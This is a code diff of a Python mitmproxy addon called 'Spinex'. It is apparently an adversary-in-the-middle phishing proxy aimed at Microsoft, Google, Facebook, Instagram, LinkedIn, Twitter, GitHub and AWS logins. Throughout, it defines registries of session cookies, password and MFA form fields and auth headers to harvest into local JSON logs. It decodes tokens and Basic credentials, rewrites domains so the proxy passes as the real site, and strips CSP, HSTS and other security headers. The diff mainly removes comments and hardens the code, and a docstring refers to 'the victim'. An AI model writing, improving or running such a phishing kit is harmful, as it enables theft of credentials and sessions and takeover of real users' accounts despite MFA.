@@ -15,309 +15,149 @@ _THIS_DIR = os.path.dirname(os.path.abspath(__file__))
 if _THIS_DIR not in sys.path:
     sys.path.insert(0, _THIS_DIR)
 
-BASE_DIR  = os.path.dirname(_THIS_DIR)   # Spinex root
+BASE_DIR  = os.path.dirname(_THIS_DIR)
 CREDS_DIR = os.path.join(BASE_DIR, "creds")
 LOG_COOKIES  = os.path.join(CREDS_DIR, "aitm_cookies.json")
 LOG_CREDS    = os.path.join(CREDS_DIR, "aitm_credentials.json")
 LOG_HEADERS  = os.path.join(CREDS_DIR, "aitm_headers.json")
 LOG_SESSIONS = os.path.join(CREDS_DIR, "aitm_sessions.json")
-LOG_SKIPPED  = os.path.join(CREDS_DIR, "aitm_skipped.json")   # optional debug log
+LOG_SKIPPED  = os.path.join(CREDS_DIR, "aitm_skipped.json")
 os.makedirs(CREDS_DIR, exist_ok=True)
 
 DEBUG_SKIPPED = False
 
 # ---------------------------------------------------------------------------
 # AUTH COOKIE REGISTRY
-#
-# Structure:
-#   platform_key -> {
-#       "domains"  : list of domain substrings to match the response origin,
-#       "cookies"  : list of exact cookie names that carry auth/session state,
-#       "patterns" : list of regex patterns for cookie names (use sparingly),
-#   }
-#
-# Priority logic (applied in order):
-#   1. Domain match — only inspect cookies from relevant origins.
-#   2. Exact name match — fast O(1) set lookup.
-#   3. Pattern match — regex fallback for variable-name tokens (e.g. JWT variants).
-#
-# To add a new platform, just append a new entry.  No other code needs to change.
 # ---------------------------------------------------------------------------
 AUTH_COOKIE_REGISTRY = {
-
     "microsoft": {
         "domains": [
-            "login.microsoft.com",
-            "login.microsoftonline.com",
-            "login.live.com",
-            "account.microsoft.com",
-            "outlook.live.com",
-            "office.com",
+            "login.microsoft.com", "login.microsoftonline.com", "login.live.com",
+            "account.microsoft.com", "outlook.live.com", "office.com",
         ],
         "cookies": {
-            # Core Azure AD session cookies
-            "ESTSAUTH",
-            "ESTSAUTHPERSISTENT",
-            "ESTSAUTHLIGHT",
-            "MSISAuth",
-            "MSISAuth1",
-            "MSISAuthenticated",
-            "MSISLoopDetectionCookie",
-            "MSISAUTH",
-            # Legacy / ADFS
-            ".ASPXAUTH",
-            "MSISSignOut",
-            # MFA / SSPR state
-            "MFA_TOTP",
-            # General Microsoft session
-            "MUID",
-            "OIDCnonce",
-            # Refresh / persistent tokens
-            "ESTSSC",
+            "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
+            "MSISAuth", "MSISAuth1", "MSISAuthenticated",
+            "MSISLoopDetectionCookie", "MSISAUTH", ".ASPXAUTH",
+            "MSISSignOut", "MFA_TOTP", "MUID", "OIDCnonce", "ESTSSC",
         },
-        "patterns": [
-            r"^x-ms-",          # x-ms-gateway-slice, stsservicecookie, etc.
-        ],
+        "patterns": [r"^x-ms-"],
     },
-
     "google": {
         "domains": [
-            "accounts.google.com",
-            "google.com",
-            "mail.google.com",
-            "workspace.google.com",
+            "accounts.google.com", "google.com",
+            "mail.google.com", "workspace.google.com",
         ],
         "cookies": {
             "SID", "HSID", "SSID", "APISID", "SAPISID",
             "NID", "SIDCC", "CONSENT",
-            # Secure prefixed variants
-            "__Secure-1PSID",
-            "__Secure-3PSID",
-            "__Secure-1PAPISID",
-            "__Secure-3PAPISID",
-            "__Secure-1PSIDCC",
-            "__Secure-3PSIDCC",
-            "__Host-1PLSID",
-            "__Host-3PLSID",
+            "__Secure-1PSID", "__Secure-3PSID",
+            "__Secure-1PAPISID", "__Secure-3PAPISID",
+            "__Secure-1PSIDCC", "__Secure-3PSIDCC",
+            "__Host-1PLSID", "__Host-3PLSID",
         },
         "patterns": [],
     },
-
     "facebook": {
-        "domains": [
-            "facebook.com",
-            "www.facebook.com",
-            "m.facebook.com",
-            "meta.com",
-        ],
-        "cookies": {
-            "c_user",   # plaintext user ID — high value
-            "xs",       # session secret
-            "fr",       # tracking + auth
-            "datr",     # device auth
-            "sb",       # secure browser ID
-            "wd",
-            "dpr",
-        },
+        "domains": ["facebook.com", "www.facebook.com", "m.facebook.com", "meta.com"],
+        "cookies": {"c_user", "xs", "fr", "datr", "sb", "wd", "dpr"},
         "patterns": [],
     },
-
     "instagram": {
-        "domains": [
-            "instagram.com",
-            "www.instagram.com",
-        ],
-        "cookies": {
-            "sessionid",        # primary auth cookie
-            "ds_user_id",       # user ID
-            "csrftoken",        # CSRF (needed alongside sessionid)
-            "mid",
-            "ig_did",
-            "ig_nrcb",
-            "rur",
-        },
+        "domains": ["instagram.com", "www.instagram.com"],
+        "cookies": {"sessionid", "ds_user_id", "csrftoken", "mid", "ig_did", "ig_nrcb", "rur"},
         "patterns": [],
     },
-
     "linkedin": {
-        "domains": [
-            "linkedin.com",
-            "www.linkedin.com",
-        ],
-        "cookies": {
-            "li_at",        # primary auth token
-            "liap",         # auth presence
-            "JSESSIONID",   # API CSRF
-            "li_gc",
-            "bcookie",
-            "bscookie",
-            "lidc",
-        },
+        "domains": ["linkedin.com", "www.linkedin.com"],
+        "cookies": {"li_at", "liap", "JSESSIONID", "li_gc", "bcookie", "bscookie", "lidc"},
         "patterns": [],
     },
-
     "twitter": {
-        "domains": [
-            "twitter.com",
-            "x.com",
-            "api.twitter.com",
-        ],
-        "cookies": {
-            "auth_token",   # primary session token
-            "ct0",          # CSRF token (must be sent with auth_token)
-            "twid",
-            "kdt",
-            "remember_checked_on",
-            "guest_id",
-        },
+        "domains": ["twitter.com", "x.com", "api.twitter.com"],
+        "cookies": {"auth_token", "ct0", "twid", "kdt", "remember_checked_on", "guest_id"},
         "patterns": [],
     },
-
     "github": {
-        "domains": [
-            "github.com",
-            "api.github.com",
-        ],
-        "cookies": {
-            "user_session",
-            "__Host-user_session_same_site",
-            "dotcom_user",
-            "logged_in",
-            "tz",
-            "_gh_sess",
-        },
+        "domains": ["github.com", "api.github.com"],
+        "cookies": {"user_session", "__Host-user_session_same_site", "dotcom_user", "logged_in", "tz", "_gh_sess"},
         "patterns": [],
     },
-
     "aws": {
-        "domains": [
-            "signin.aws.amazon.com",
-            "console.aws.amazon.com",
-        ],
-        "cookies": {
-            "aws-creds",
-            "aws-userInfo",
-            "aws-selectedRegion",
-            "JSESSIONID",
-            "aws-account-alias",
-            "noflush",
-        },
-        "patterns": [
-            r"^aws-",
-        ],
+        "domains": ["signin.aws.amazon.com", "console.aws.amazon.com"],
+        "cookies": {"aws-creds", "aws-userInfo", "aws-selectedRegion", "JSESSIONID", "aws-account-alias", "noflush"},
+        "patterns": [r"^aws-"],
     },
-
-    # Applied when no domain-specific platform matched.
     "_generic": {
-        "domains": [],   # empty = matches any domain not already matched above
+        "domains": [],
         "cookies": {
-            "session",
-            "sessionid",
-            "session_token",
-            "access_token",
-            "refresh_token",
-            "id_token",
-            "auth_token",
-            "authtoken",
-            "token",
-            "jwt",
-            "PHPSESSID",
-            "JSESSIONID",
-            "ASP.NET_SessionId",
-            "connect.sid",   # Express/Node.js
-            "remember_token",
-            "remember_me",
-            "_session_id",
-            "user_session",
+            "session", "sessionid", "session_token", "access_token", "refresh_token",
+            "id_token", "auth_token", "authtoken", "token", "jwt", "PHPSESSID",
+            "JSESSIONID", "ASP.NET_SessionId", "connect.sid", "remember_token",
+            "remember_me", "_session_id", "user_session",
         },
         "patterns": [
-            r"^jwt[_\-]",
-            r"[_\-]token$",
-            r"[_\-]session$",
-            r"^auth[_\-]",
+            r"^jwt[_\-]", r"[_\-]token$", r"[_\-]session$", r"^auth[_\-]",
         ],
     },
 }
 
 # ---------------------------------------------------------------------------
 # CREDENTIAL FIELD REGISTRY
-#
-# Maps each platform to the POST body field names that carry credentials.
-# Split into three buckets so we know what was captured:
-#   "username" — identity fields (email, login name, phone)
-#   "password" — secret fields
-#   "mfa"      — one-time codes, TOTP, push tokens
-#
-# Platform-specific names take priority; the "_generic" bucket covers
-# everything else.
 # ---------------------------------------------------------------------------
 CRED_FIELD_REGISTRY = {
-
-    # Azure AD / O365 login.microsoftonline.com uses its own field names
     "microsoft": {
         "username": {"loginfmt", "login_hint", "username"},
         "password": {"passwd", "Password"},
         "mfa":      {"otc", "accesspass", "mfaLastError", "sacxt"},
     },
-
     "google": {
         "username": {"identifier", "Email", "email"},
         "password": {"Passwd", "password"},
         "mfa":      {"totpPin", "idvPin", "challengeId", "pin"},
     },
-
     "facebook": {
         "username": {"email", "username"},
         "password": {"pass", "password", "encpass"},
         "mfa":      {"approvals_code", "mfa_code"},
     },
-
-    # Instagram API uses JSON body
     "instagram": {
         "username": {"username"},
         "password": {"password", "enc_password"},
         "mfa":      {"verification_code", "identifier"},
     },
-
     "linkedin": {
         "username": {"session_key", "username", "email"},
         "password": {"session_password", "password"},
         "mfa":      {"pin", "challengeId"},
     },
-
     "twitter": {
         "username": {"username", "email", "phone_number"},
         "password": {"password"},
         "mfa":      {"challenge_response", "totp_code"},
     },
-
     "github": {
         "username": {"login"},
         "password": {"password"},
         "mfa":      {"app_otp", "otp", "sms_otp"},
     },
-
     "aws": {
         "username": {"email", "username", "accountId"},
         "password": {"password", "passwd"},
         "mfa":      {"mfacode", "totpUserCode", "mfa_totp_token"},
     },
-
     "_generic": {
         "username": {
-            "username", "user", "login", "email", "mail",
-            "user_name", "userid", "user_id", "identifier",
-            "account", "handle", "phone", "mobile",
+            "username", "user", "login", "email", "mail", "user_name",
+            "userid", "user_id", "identifier", "account", "handle", "phone", "mobile",
         },
         "password": {
-            "password", "passwd", "pass", "pwd", "secret",
-            "credential", "pin", "passphrase",
+            "password", "passwd", "pass", "pwd", "secret", "credential", "pin", "passphrase",
         },
         "mfa": {
-            "otp", "totp", "mfa", "2fa", "twofa", "two_fa",
-            "code", "token", "verification_code", "auth_code",
-            "authenticator_code", "one_time_password",
-            "sms_code", "backup_code",
+            "otp", "totp", "mfa", "2fa", "twofa", "two_fa", "code", "token",
+            "verification_code", "auth_code", "authenticator_code",
+            "one_time_password", "sms_code", "backup_code",
         },
     },
 }
@@ -333,10 +173,6 @@ for _platform, _cfg in AUTH_COOKIE_REGISTRY.items():
 
 
 def _match_platform(host: str) -> list[str]:
-    """
-    Return a list of platform keys whose domain list matches *host*.
-    Always appends '_generic' as the last fallback.
-    """
     matched = []
     for platform, cfg in _COMPILED_REGISTRY.items():
         if platform == "_generic":
@@ -350,23 +186,17 @@ def _match_platform(host: str) -> list[str]:
 
 
 def _is_auth_cookie(name: str, platforms: list[str]) -> tuple[bool, str]:
-    """
-    Return (True, platform_key) if *name* is considered an auth cookie for
-    any of the given platforms, else (False, '').
-    """
     for platform in platforms:
         cfg = _COMPILED_REGISTRY[platform]
-        # 1. Exact match (fast path)
         if name in cfg["cookies"]:
             return True, platform
-        # 2. Pattern match (slower, only if exact fails)
         for pattern in cfg["patterns"]:
             if pattern.search(name):
                 return True, platform
     return False, ""
 
+
 def convert_bytes(obj):
-    """Recursively decode bytes → str so everything is JSON-serialisable."""
     if isinstance(obj, bytes):
         return obj.decode("utf-8", errors="replace")
     if isinstance(obj, dict):
@@ -379,7 +209,6 @@ def convert_bytes(obj):
 
 
 def _append_log(filename: str, entry: dict) -> None:
-    """Append a JSON line to *filename*, creating the file if needed."""
     try:
         os.makedirs(os.path.dirname(filename), exist_ok=True)
         with open(filename, "a") as f:
@@ -389,39 +218,22 @@ def _append_log(filename: str, entry: dict) -> None:
 
 
 def _classify_field(field_name: str, platforms: list[str]) -> str | None:
-    """
-    Return 'username', 'password', or 'mfa' if *field_name* is a credential
-    field for any matched platform, else None.
-    Platform-specific registries are checked before _generic.
-    """
     for platform in platforms:
         cfg = CRED_FIELD_REGISTRY.get(platform)
         if not cfg:
             continue
         name_lower = field_name.lower()
         for bucket in ("username", "password", "mfa"):
-            # Case-insensitive exact check against the set
             if field_name in cfg[bucket] or name_lower in {v.lower() for v in cfg[bucket]}:
                 return bucket
     return None
 
 
 def _parse_post_body(flow: http.HTTPFlow) -> dict:
-    """
-    Parse a POST request body into a flat {field: value} dict.
-    Handles three content types:
-      1. application/x-www-form-urlencoded  — HTML login forms
-      2. application/json                   — SPA / API logins
-      3. multipart/form-data                — rare but possible
-
-    Returns an empty dict if the body is absent, non-POST, or unparseable.
-    """
     if flow.request.method.upper() != "POST":
         return {}
-
     content_type = flow.request.headers.get("content-type", "").lower()
-    raw = flow.request.content  # bytes
-
+    raw = flow.request.content
     if not raw:
         return {}
 
@@ -430,7 +242,6 @@ def _parse_post_body(flow: http.HTTPFlow) -> dict:
             from urllib.parse import parse_qs
             decoded = raw.decode("utf-8", errors="replace")
             parsed  = parse_qs(decoded, keep_blank_values=True)
-            # parse_qs returns lists; flatten to single values
             return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
         except Exception:
             traceback.print_exc()
@@ -442,7 +253,6 @@ def _parse_post_body(flow: http.HTTPFlow) -> dict:
             parsed  = json.loads(decoded)
             if isinstance(parsed, dict):
                 return parsed
-            # Some APIs send [{"key": ..., "value": ...}] arrays
             if isinstance(parsed, list):
                 return {item.get("key", f"item_{i}"): item.get("value", "")
                         for i, item in enumerate(parsed) if isinstance(item, dict)}
@@ -452,12 +262,10 @@ def _parse_post_body(flow: http.HTTPFlow) -> dict:
 
     if "multipart/form-data" in content_type:
         try:
-            # Extract boundary from Content-Type header
             boundary_match = re.search(r"boundary=([^\s;]+)", content_type)
             if boundary_match:
                 boundary = boundary_match.group(1).encode()
                 fields   = {}
-                # Split on boundary, parse each part for Content-Disposition
                 for part in raw.split(b"--" + boundary):
                     if b"Content-Disposition" not in part:
                         continue
@@ -480,129 +288,64 @@ def _parse_post_body(flow: http.HTTPFlow) -> dict:
 
 # ---------------------------------------------------------------------------
 # AUTH HEADER REGISTRY
-#
-# Structure per platform:
-#   "headers"  : exact header names (case-insensitive in HTTP but stored
-#                lowercase for normalised matching)
-#   "patterns" : regex patterns for header names (e.g. x-amz-*)
-#
-# The special "_authorization" key is handled separately because the
-# Authorization header needs its *scheme* parsed (Bearer / Basic / AWS4 / Token).
 # ---------------------------------------------------------------------------
 AUTH_HEADER_REGISTRY = {
-
     "microsoft": {
         "domains": [
-            "login.microsoft.com", "login.microsoftonline.com",
-            "login.live.com", "graph.microsoft.com",
-            "outlook.office365.com", "office.com",
+            "login.microsoft.com", "login.microsoftonline.com", "login.live.com",
+            "graph.microsoft.com", "outlook.office365.com", "office.com",
         ],
-        "headers": {
-            # Graph API / MSAL tokens land here
-            "authorization",
-            # OBO / ADFS custom headers
-            "x-ms-client-request-id",
-        },
+        "headers": {"authorization", "x-ms-client-request-id"},
         "patterns": [r"^x-ms-"],
     },
-
     "google": {
         "domains": [
             "accounts.google.com", "oauth2.googleapis.com",
             "www.googleapis.com", "mail.google.com",
         ],
-        "headers": {
-            "authorization",
-            "x-goog-authuser",
-            "x-goog-api-key",
-        },
+        "headers": {"authorization", "x-goog-authuser", "x-goog-api-key"},
         "patterns": [r"^x-goog-"],
     },
-
     "facebook": {
         "domains": ["graph.facebook.com", "api.facebook.com", "facebook.com"],
-        "headers": {
-            "authorization",
-            "x-fb-friendly-name",
-        },
+        "headers": {"authorization", "x-fb-friendly-name"},
         "patterns": [],
     },
-
     "instagram": {
         "domains": ["i.instagram.com", "instagram.com"],
-        "headers": {
-            "authorization",
-            "x-ig-app-id",
-            "x-ig-www-claim",
-            "x-csrftoken",
-        },
+        "headers": {"authorization", "x-ig-app-id", "x-ig-www-claim", "x-csrftoken"},
         "patterns": [r"^x-ig-"],
     },
-
     "twitter": {
         "domains": ["api.twitter.com", "api.x.com", "twitter.com", "x.com"],
-        "headers": {
-            "authorization",      # Bearer + OAuth1 both appear here
-            "x-twitter-auth-type",
-            "x-csrf-token",
-        },
+        "headers": {"authorization", "x-twitter-auth-type", "x-csrf-token"},
         "patterns": [],
     },
-
     "github": {
         "domains": ["api.github.com", "github.com"],
-        "headers": {
-            "authorization",     # "token ghp_..." or "Bearer ..."
-            "x-github-token",
-        },
+        "headers": {"authorization", "x-github-token"},
         "patterns": [],
     },
-
     "aws": {
-        "domains": [
-            "signin.aws.amazon.com", "console.aws.amazon.com",
-            "sts.amazonaws.com",
-        ],
-        "headers": {
-            "authorization",          # AWS4-HMAC-SHA256 Credential=...
-            "x-amz-security-token",   # temporary STS session token (very high value)
-            "x-amz-date",
-        },
+        "domains": ["signin.aws.amazon.com", "console.aws.amazon.com", "sts.amazonaws.com"],
+        "headers": {"authorization", "x-amz-security-token", "x-amz-date"},
         "patterns": [r"^x-amz-"],
     },
-
     "linkedin": {
         "domains": ["api.linkedin.com", "linkedin.com"],
-        "headers": {
-            "authorization",
-            "csrf-token",
-            "x-restli-protocol-version",
-        },
+        "headers": {"authorization", "csrf-token", "x-restli-protocol-version"},
         "patterns": [],
     },
-
     "_generic": {
         "domains": [],
         "headers": {
-            "authorization",
-            "x-auth-token",
-            "x-api-key",
-            "x-access-token",
-            "x-id-token",
-            "x-refresh-token",
-            "x-csrf-token",
-            "api-key",
-            "token",
+            "authorization", "x-auth-token", "x-api-key", "x-access-token",
+            "x-id-token", "x-refresh-token", "x-csrf-token", "api-key", "token",
         },
-        "patterns": [
-            r"^x-auth-",
-            r"^x-api-",
-            r"[_-]token$",
-        ],
+        "patterns": [r"^x-auth-", r"^x-api-", r"[_-]token$"],
     },
 }
 
-# Pre-compile header patterns
 _COMPILED_HEADER_REGISTRY = {}
 for _platform, _cfg in AUTH_HEADER_REGISTRY.items():
     _COMPILED_HEADER_REGISTRY[_platform] = {
@@ -613,7 +356,6 @@ for _platform, _cfg in AUTH_HEADER_REGISTRY.items():
 
 
 def _match_header_platform(host: str) -> list[str]:
-    """Same domain-matching logic as _match_platform but for the header registry."""
     matched = []
     for platform, cfg in _COMPILED_HEADER_REGISTRY.items():
         if platform == "_generic":
@@ -627,7 +369,6 @@ def _match_header_platform(host: str) -> list[str]:
 
 
 def _is_auth_header(header_name: str, platforms: list[str]) -> bool:
-    """Return True if header_name should be captured for any matched platform."""
     name_lower = header_name.lower()
     for platform in platforms:
         cfg = _COMPILED_HEADER_REGISTRY.get(platform)
@@ -642,19 +383,12 @@ def _is_auth_header(header_name: str, platforms: list[str]) -> bool:
 
 
 def _decode_jwt(token: str) -> dict | None:
-    """
-    Base64-decode a JWT's header and payload sections (no verification).
-    Returns {"header": {...}, "payload": {...}} or None on failure.
-    Useful for extracting sub/email/oid/tid from Microsoft/Google tokens.
-    """
     try:
         parts = token.split(".")
         if len(parts) != 3:
             return None
-
         decoded = {}
         for i, label in enumerate(("header", "payload")):
-            # JWT uses base64url without padding — add padding back
             segment = parts[i]
             segment += "=" * (-len(segment) % 4)
             decoded[label] = json.loads(base64.urlsafe_b64decode(segment))
@@ -664,18 +398,7 @@ def _decode_jwt(token: str) -> dict | None:
 
 
 def _parse_authorization_header(value: str) -> dict:
-    """
-    Parse the Authorization header value into structured fields.
-
-    Handles:
-      Bearer <jwt_or_opaque>   — OAuth2 / OIDC
-      Basic <base64>           — HTTP Basic Auth (decodes user:pass)
-      Token <value>            — GitHub PAT style
-      AWS4-HMAC-SHA256 ...     — AWS Signature v4
-      OAuth <params>           — OAuth 1.0a (Twitter legacy)
-    """
     result = {"raw": value}
-
     if not value:
         return result
 
@@ -688,7 +411,6 @@ def _parse_authorization_header(value: str) -> dict:
         jwt_data = _decode_jwt(rest.strip())
         if jwt_data:
             result["jwt_decoded"] = jwt_data
-            # Surface the most useful identity claims at the top level
             payload = jwt_data.get("payload", {})
             for claim in ("sub", "email", "upn", "preferred_username",
                           "oid", "tid", "azp", "iss", "exp", "scp", "scope"):
@@ -708,16 +430,14 @@ def _parse_authorization_header(value: str) -> dict:
         result["token"] = rest.strip()
 
     elif scheme == "aws4-hmac-sha256":
-        # Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request
-        cred_match = re.search(r"Credential=([^,\s]+)", value)
-        sig_match  = re.search(r"Signature=([^,\s]+)", value)
+        cred_match = re.search(r"Credential=([^\s]+)", value)
+        sig_match  = re.search(r"Signature=([^\s]+)", value)
         if cred_match:
             result["credential"] = cred_match.group(1)
         if sig_match:
             result["signature"] = sig_match.group(1)
 
     elif scheme == "oauth":
-        # Extract oauth_token and oauth_consumer_key
         for param in ("oauth_token", "oauth_consumer_key", "oauth_signature"):
             m = re.search(rf'{param}="([^"]+)"', value)
             if m:
@@ -727,15 +447,7 @@ def _parse_authorization_header(value: str) -> dict:
 
 
 def _extract_auth_headers(flow: http.HTTPFlow, platforms: list[str]) -> dict:
-    """
-    Walk all request headers and return a dict of captured auth headers.
-    The Authorization header gets special parsed treatment; others are
-    captured as raw values.
-
-    Returns {} if nothing worth logging was found.
-    """
     captured = {}
-
     for header_name, header_value in flow.request.headers.items():
         header_name  = convert_bytes(header_name)
         header_value = convert_bytes(header_value)
@@ -744,10 +456,8 @@ def _extract_auth_headers(flow: http.HTTPFlow, platforms: list[str]) -> dict:
             continue
 
         name_lower = header_name.lower()
-
         if name_lower == "authorization":
             parsed = _parse_authorization_header(header_value)
-            # Skip trivial / empty Authorization headers
             if parsed.get("scheme") in (None, "") and not parsed.get("token"):
                 continue
             captured["authorization"] = parsed
@@ -758,14 +468,7 @@ def _extract_auth_headers(flow: http.HTTPFlow, platforms: list[str]) -> dict:
 
 
 # ---------------------------------------------------------------------------
-# DOMAIN MAP  — loaded from spinex_config.json via config_manager
-#
-# To configure: edit spinex_config.json (or use the Streamlit config page)
-# and set your base domain + enable target platforms.
-# config_manager.generate_domain_map() builds this dict automatically.
-#
-# Falls back to an empty dict (rewriting disabled) if config is missing
-# or no platforms are enabled — safe to run without config for testing.
+# DOMAIN MAP  -- loaded from spinex_config.json via config_manager
 # ---------------------------------------------------------------------------
 try:
     import config_manager as _cm
@@ -774,16 +477,28 @@ try:
     if DOMAIN_MAP:
         print(f"[Spinex] Loaded {len(DOMAIN_MAP)} domain mappings from spinex_config.json")
     else:
-        print("[Spinex] No domain mappings configured — rewriting disabled. Set base domain in config.")
+        print("[Spinex] No domain mappings configured -- rewriting disabled.")
 except Exception:
-    print("[Spinex] Could not load config_manager — falling back to empty DOMAIN_MAP.")
+    print("[Spinex] Could not load config_manager -- falling back to empty DOMAIN_MAP.")
     DOMAIN_MAP: dict[str, str] = {}
 
-# Inverted map: proxy domain → real domain (built automatically)
 _REVERSE_DOMAIN_MAP: dict[str, str] = {v: k for k, v in DOMAIN_MAP.items()}
 
 # ---------------------------------------------------------------------------
-# Security headers to strip so the browser doesn't block our rewriting
+# BASE DOMAIN DETECTION -- prevents proxy loopback to self
+# ---------------------------------------------------------------------------
+_BASE_DOMAINS: set[str] = set()
+for _proxy_domain in DOMAIN_MAP.values():
+    _parts = _proxy_domain.split(".")
+    if len(_parts) >= 2:
+        _base = ".".join(_parts[-2:])
+        _BASE_DOMAINS.add(_base)
+
+if _BASE_DOMAINS:
+    print(f"[Spinex] Base domains (loopback protected): {_BASE_DOMAINS}")
+
+# ---------------------------------------------------------------------------
+# Security headers to strip
 # ---------------------------------------------------------------------------
 _STRIP_RESPONSE_HEADERS = {
     "content-security-policy",
@@ -799,31 +514,40 @@ _STRIP_RESPONSE_HEADERS = {
     "cross-origin-resource-policy",
 }
 
-# Content-type groups
 _HTML_TYPES = {"text/html", "application/xhtml+xml"}
 _JS_TYPES   = {"application/javascript", "text/javascript",
                "application/x-javascript", "module"}
 _CSS_TYPES  = {"text/css"}
 
-# HTML attributes whose values are URLs
 _URL_ATTRIBUTES = re.compile(
-    r"""((?:href|src|action|data-url|data-href|data-src|content|srcset|poster|"""
-    r"""formaction|ping|manifest|codebase)\s*=\s*['"])([^'"]+)(['"])""",
+    r"""((?:href|src|action|data-url|data-href|data-src|content|srcset|poster|
+    formaction|ping|manifest|codebase)\s*=\s*['"])([^'"]+)(['"])""",
     re.IGNORECASE | re.VERBOSE,
 )
 _META_REFRESH = re.compile(
-    r"(content\s*=\s*['\"][\d.]+;\s*url\s*=\s*)([^'\"]+)(['\"])",
+    r"""(content\s*=\s*['"][\d.]+\s*url\s*=\s*)([^'"]+)(['"])""",
     re.IGNORECASE,
 )
-_CSS_URL = re.compile(r"(url\s*\(\s*['\"]?)([^'\")]+)(['\"]?\s*\))", re.IGNORECASE)
+_CSS_URL = re.compile(
+    r"""(url\s*\(\s*['"]?)([^'")]+)(['"]?\s*\))""",
+    re.IGNORECASE,
+)
 
-def _decompress_body(flow: http.HTTPFlow) -> bytes | None:
-    """Improved decompression with better error handling"""
+
+def _decompress_body(flow: http.HTTPFlow) -> tuple[bytes | None, bool]:
+    """
+    Decompress response body. Returns (body_bytes, can_rewrite).
+    can_rewrite is False if the body is compressed and we could not decompress it
+    (e.g. brotli not installed) -- in that case we MUST NOT touch the body.
+    """
     raw = flow.response.raw_content
     if not raw:
-        return None
+        return None, True
 
     encoding = flow.response.headers.get("content-encoding", "").lower()
+    if not encoding:
+        return raw, True
+
     try:
         if "gzip" in encoding:
             body = gzip.decompress(raw)
@@ -837,24 +561,24 @@ def _decompress_body(flow: http.HTTPFlow) -> bytes | None:
                 import brotli
                 body = brotli.decompress(raw)
             except ImportError:
-                print("[Spinex] Brotli not installed, skipping")
-                return raw
+                print("[Spinex] Brotli not installed -- skipping body rewrite for this response")
+                return raw, False
         else:
-            body = raw
+            return raw, False
 
-        # Remove encoding header after decompression
-        if encoding:
-            del flow.response.headers["content-encoding"]
+        del flow.response.headers["content-encoding"]
+        return body, True
 
-        return body
     except Exception as e:
-        print(f"[Spinex] Decompression failed: {e}")
-        return raw
+        print(f"[Spinex] Decompression failed ({encoding}): {e}")
+        return raw, False
+
 
 def _replace_domains(text: str) -> str:
     """
     Replace all real upstream domains with their proxy counterparts.
-    Handles https://, http://, //, and bare domain occurrences.
+    Uses URL-aware replacements first, then regex word-boundary for bare domains
+    so we don't corrupt JavaScript variables or JSON keys.
     """
     if not DOMAIN_MAP:
         return text
@@ -862,15 +586,23 @@ def _replace_domains(text: str) -> str:
         text = text.replace(f"https://{real}", f"https://{proxy}")
         text = text.replace(f"http://{real}",  f"http://{proxy}")
         text = text.replace(f"//{real}",        f"//{proxy}")
-        text = text.replace(real,               proxy)
+        escaped = re.escape(real)
+        text = re.sub(rf"(?<![\w.-]){escaped}(?![\w.-])", proxy, text)
     return text
 
 
+def _rewrite_json(obj):
+    """Walk a JSON structure and replace domains only inside string values."""
+    if isinstance(obj, str):
+        return _replace_domains(obj)
+    if isinstance(obj, dict):
+        return {_rewrite_json(k): _rewrite_json(v) for k, v in obj.items()}
+    if isinstance(obj, list):
+        return [_rewrite_json(item) for item in obj]
+    return obj
+
+
 def _rewrite_set_cookie_domain(flow: http.HTTPFlow) -> None:
-    """
-    Rewrite the Domain= attribute in Set-Cookie headers so cookies are scoped
-    to the proxy domain, not the real domain.
-    """
     if not DOMAIN_MAP:
         return
     new_headers = []
@@ -890,15 +622,14 @@ def _rewrite_set_cookie_domain(flow: http.HTTPFlow) -> None:
 
 
 def _rewrite_location_header(flow: http.HTTPFlow) -> None:
-    """Keep redirect Location headers pointing at the proxy, not the real site."""
     location = flow.response.headers.get("location", "")
     if location:
         new_location = _replace_domains(location)
         if new_location != location:
             flow.response.headers["location"] = new_location
 
+
 def _rewrite_html(body: str) -> str:
-    """Rewrite HTML: URL attributes, meta-refresh, inline scripts/styles."""
     if not DOMAIN_MAP:
         return body
 
@@ -911,7 +642,6 @@ def _rewrite_html(body: str) -> str:
     body = _URL_ATTRIBUTES.sub(replace_attr, body)
     body = _META_REFRESH.sub(replace_meta, body)
 
-    # Inline <script> blocks
     def replace_script(m: re.Match) -> str:
         return m.group(1) + _rewrite_js(m.group(2)) + m.group(3)
 
@@ -922,7 +652,6 @@ def _rewrite_html(body: str) -> str:
         flags=re.DOTALL | re.IGNORECASE,
     )
 
-    # Inline <style> blocks
     def replace_style(m: re.Match) -> str:
         return m.group(1) + _rewrite_css(m.group(2)) + m.group(3)
 
@@ -933,56 +662,42 @@ def _rewrite_html(body: str) -> str:
         flags=re.DOTALL | re.IGNORECASE,
     )
 
-    # Catch-all for remaining bare domain refs in data-* attrs / text nodes
     body = _replace_domains(body)
     return body
 
 
 def _rewrite_js(js: str) -> str:
-    """Rewrite domain references inside JavaScript."""
     if not DOMAIN_MAP:
         return js
     return _replace_domains(js)
 
 
 def _rewrite_css(css: str) -> str:
-    """Rewrite url() references inside CSS."""
     if not DOMAIN_MAP:
         return css
-
     def replace_css_url(m: re.Match) -> str:
         return m.group(1) + _replace_domains(m.group(2)) + m.group(3)
-
     return _CSS_URL.sub(replace_css_url, css)
 
 
 def _rewrite_response(flow: http.HTTPFlow) -> None:
     """
-    Full response rewrite pipeline:
-      1. Strip security headers (CSP, HSTS, X-Frame-Options, COOP, …)
-      2. Rewrite Set-Cookie Domain attributes
-      3. Rewrite Location redirect header
-      4. Decompress body
-      5. Rewrite body (HTML / JS / CSS / JSON) based on Content-Type
-      6. Write back plain UTF-8 body with updated Content-Length
+    Full response rewrite pipeline.
+    If body decompression fails, we skip body rewriting entirely so we don't
+    serve garbled binary to the victim.
     """
     if not DOMAIN_MAP:
         return
 
-    # 1. Strip restrictive headers
     for header in list(flow.response.headers.keys()):
         if header.lower() in _STRIP_RESPONSE_HEADERS:
             del flow.response.headers[header]
 
-    # 2. Cookie domain rewrite
     _rewrite_set_cookie_domain(flow)
-
-    # 3. Redirect rewrite
     _rewrite_location_header(flow)
 
-    # Determine content type
     content_type = flow.response.headers.get("content-type", "").lower()
-    ct_base      = content_type.split(";")[0].strip()
+    ct_base = content_type.split(";")[0].strip()
 
     needs_rewrite = (
         ct_base in _HTML_TYPES or
@@ -993,9 +708,8 @@ def _rewrite_response(flow: http.HTTPFlow) -> None:
     if not needs_rewrite:
         return
 
-    # 4. Decompress
-    body_bytes = _decompress_body(flow)
-    if not body_bytes:
+    body_bytes, can_rewrite = _decompress_body(flow)
